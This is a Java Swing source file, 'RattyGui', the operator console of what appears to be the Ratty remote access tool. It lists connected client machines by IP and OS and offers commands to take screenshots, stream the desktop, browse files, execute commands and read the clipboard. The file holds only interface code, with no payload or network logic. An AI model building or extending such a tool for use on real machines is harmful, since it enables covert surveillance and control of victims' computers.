package de.sogomn.rat.server.gui;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.fx.SpriteSheet;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class RattyGui {
	
	private JFrame frame;
	
	private JTable table;
	private DefaultTableModel tableModel;
	private long lastIdClicked;
	private JScrollPane scrollPane;
	
	private JPopupMenu menu;
	
	private Screen screen;
	private BufferedImage image;
	
	private IGuiController controller;
	
	private static final String[] HEADERS = {
		"ID",
		"Name",
		"IP address",
		"OS",
		"Version",
		"Streaming"
	};
	
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	
	private static final BufferedImage GUI_ICON = ImageUtils.scaleImage(ImageUtils.loadImage("/gui_icon.png"), 64, 64);
	private static final BufferedImage[] MENU_ICONS = new SpriteSheet("/menu_icons.png", 16, 16).getSprites();
	
	public static final String POPUP = "Open popup";
	public static final String SCREENSHOT = "Take screenshot";
	public static final String DESKTOP = "Start desktop stream";
	public static final String DESKTOP_STOP = "Stop desktop stream";
	public static final String FILES = "Browse files";
	public static final String COMMAND = "Execute command";
	public static final String CLIPBOARD = "Get clipboard content";
	public static final String FREE = "Free client";
	
	public static final String[] COMMANDS = {
		POPUP,
		SCREENSHOT,
		DESKTOP,
		DESKTOP_STOP,
		FILES,
		COMMAND,
		CLIPBOARD,
		FREE
	};
	
	public RattyGui() {
		frame = new JFrame();
		table = new JTable();
		tableModel = (DefaultTableModel)table.getModel();
		scrollPane = new JScrollPane(table, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		menu = new JPopupMenu();
		
		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
			final String command = COMMANDS[i];
			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
			
			addMenuItem(command, icon);
		}
		
		final MouseAdapter mouseAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final Point mousePoint = m.getPoint();
				final int row = table.rowAtPoint(mousePoint);
				
				lastIdClicked = (Long)tableModel.getValueAt(row, 0);
			}
		};
		
		scrollPane.setBorder(null);
		tableModel.setColumnIdentifiers(HEADERS);
		table.setEnabled(false);
		table.setComponentPopupMenu(menu);
		table.addMouseListener(mouseAdapter);
		
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setContentPane(scrollPane);
		frame.pack();
		frame.setLocationByPlatform(true);
		frame.setIconImage(GUI_ICON);
		frame.setVisible(true);
		frame.requestFocus();
	}
	
	private Screen createScreen(final int width, final int height) {
		final Screen screen = new Screen(width, height);
		
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.setBackgroundColor(Color.BLACK);
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		
		return screen;
	}
	
	private void addMenuItem(final String name, final Icon icon) {
		final JMenuItem item = new JMenuItem(name);
		
		item.setActionCommand(name);
		item.addActionListener(this::menuItemClicked);
		item.setIcon(icon);
		
		menu.add(item);
	}
	
	private void menuItemClicked(final ActionEvent a) {
		if (controller == null) {
			return;
		}
		
		final String command = a.getActionCommand();
		
		controller.userInput(command);
	}
	
	private void drawToScreenImage(final BufferedImage imagePart, final int x, final int y) {
		final Graphics2D g = image.createGraphics();
		
		ImageUtils.applyHighGraphics(g);
		
		g.drawImage(imagePart, x, y, null);
		g.dispose();
	}
	
	public void openScreen(final int width, final int height) {
		if (screen == null || screen.getInitialWidth() != width || screen.getInitialHeight() != height || !screen.isOpen()) {
			if (screen != null) {
				screen.close();
			}
			
			screen = createScreen(width, height);
		}
		
		screen.show();
		screen.redraw();
	}
	
	public void showImage(final BufferedImage image) {
		this.image = image;
		
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		openScreen(width, height);
	}
	
	public void showFrame(final IFrame frame, final int screenWidth, final int screenHeight) {
		if (image == null || image.getWidth() != screenWidth || image.getHeight() != screenHeight) {
			image = new BufferedImage(screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB);
		}
		
		drawToScreenImage(frame.image, frame.x, frame.y);
		openScreen(screenWidth, screenHeight);
	}
	
	public void addTableRow(final long id, final String name, final String address, final String os, final String version) {
		final Object[] data = {id, name, address, os, version, false};
		
		tableModel.addRow(data);
	}
	
	public void removeTableRow(final long id) {
		final int rows = tableModel.getRowCount();
		
		for (int i = 0; i < rows; i++) {
			final long rowId = (Long)tableModel.getValueAt(i, 0);
			
			if (rowId == id) {
				tableModel.removeRow(i);
				
				return;
			}
		}
	}
	
	public void setStreaming(final long id, final boolean state) {
		final int rows = tableModel.getRowCount();
		
		for (int i = 0; i < rows; i++) {
			final long rowId = (Long)tableModel.getValueAt(i, 0);
			
			if (rowId == id) {
				tableModel.setValueAt(state, i, 5);	//Column 5 = Streaming
			}
		}
	}
	
	public void setController(final IGuiController controller) {
		this.controller = controller;
	}
	
	public long getLastIdClicked() {
		return lastIdClicked;
	}
	
	public boolean isScreenVisible() {
		return screen.isVisible();
	}
	
	public static void showMessage(final String message) {
		final JOptionPane optionPane = new JOptionPane(message);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public static String getInput() {
		final String input = JOptionPane.showInputDialog(null);
		
		return input;
	}
	
}
